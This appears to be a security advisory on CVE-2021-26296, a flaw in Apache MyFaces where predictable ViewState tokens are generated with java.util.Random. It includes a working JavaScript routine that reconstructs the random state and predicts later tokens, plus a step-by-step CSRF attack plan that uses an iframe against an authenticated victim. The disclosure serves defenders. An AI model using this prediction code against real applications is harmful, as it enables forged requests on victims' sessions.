Vulnerability in Apache MyFaces affects WebSphere Application Server 


https://dailycve.com/vulnerability-apache-myfaces-affects-websphere-application-server-cve-2021-26296

By default, the class
`org.apache.myfaces.application.viewstate.RandomKeyFactory` is used to
generate ViewState parameter values. This class uses the method
`java.util.Random#nextBytes` as well as a per-session counter value to
generate ViewState strings.

The following JavaScript snippet demonstrates the generation of the random
part of a ViewState value based on the random part of a previously issued
ViewState parameter:

``` {.javascript}
const multiplier = 0x5DEECE66Dn;
const addend = 0xBn;
const mask = (1n << 48n) - 1n;

const unbyte = (bytes, offset) => BigInt(
    Array.from(bytes.slice(offset, offset + 4))
    .map((b, i) => b << (8 * i))
    .reduce((a, b) => a + b));

const longify = n => integer(n, 8n);
const intify = n => integer(n, 4n);
const byteify = n => integer(n, 1n);

function integer(n, len) {
    const bits = len * 8n;
    const hspan = 1n << (bits - 1n);
    return ((n + hspan) % (2n * hspan)) - hspan;
}

const hexToByteArray = s => (new Uint8Array(s.length / 2)
    .map((_, i) => (
        parseInt(s.charAt(2 * i), 16) << 4 |
        parseInt(s.charAt(2 * i + 1), 16))));

const byteArrayToHex = b => (Array.from(b)
    .map(x => (((x + 0x100).toString(16)).substr(-2)))
    .reduce((a, b) => a + b))
    .toUpperCase();

// based on https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java
function replicatedRandom(bytes) {
    let seed = 0;

    replicateState(
        unbyte(bytes, bytes.length - 8), 32n,
        unbyte(bytes, bytes.length - 4), 32n);

    return nextBytes(bytes.length);

    function replicateState(nextN, n, nextM, m) {
        const upperMOf48Mask = ((1n << m) - 1n) << (48n - m);
        const oldSeedUpperN = (nextN << (48n - n)) & mask;
        const newSeedUpperM = (nextM << (48n - m)) & mask;

        let possibilityCount = 0;

        for (let oldSeed = oldSeedUpperN;
                oldSeed <= (oldSeedUpperN | ((1n << (48n - n)) - 1n));
                oldSeed++) {
            const newSeed = longify(
                longify(oldSeed * multiplier + addend) & mask);

            if ((newSeed & upperMOf48Mask) == newSeedUpperM) {
                possibilityCount++;
                seed = newSeed;
            }
        }

        if (possibilityCount != 1) throw new Error('replicateState failed');
    }

    function next(bits) {
        seed = longify(longify(seed * multiplier + addend) & mask);
        return intify(seed >> (48n - bits));
    }

    function nextBytes(count) {
        const res = new Int8Array(count);

        for (let i = 0; i < count; ) {
            let rnd = next(32n);
            for (let n = Math.min(count - i, 4); n > 0; n--) {
                res[i++] = parseInt(byteify(rnd));
                rnd >>= 8n;
            }
        }

        return res;
    }
}
```

An attacker can exploit this issue as follows:

1.  An attacker lures an authenticated victim to an attacker-controlled
    website.
2.  As the victim opens the website, the attacker requests a ViewState value
    from the application.
3.  The exploit script opens the target JSF page e.g. in an iframe. For this
    page, the vulnerable application generates a new random ViewState value.
4.  The attacker now predicts a number of the random strings based on the
    ViewState value received in step 2. As the victim's ViewState value is
    generated just after the attacker's ViewState value, it is very likely,
    that the victim's ViewState value is among the generated ones.
5.  The exploit script sends several CSRF requests containing combinations of
    predicted random strings and sequence numbers. If guessed correctly, the
    vulnerable application accepts the attacker's request.

A similar approach is possible to attack protected pages. Unlike the ViewState
values, the CSRF token generated, however, do not contain a sequence counter.
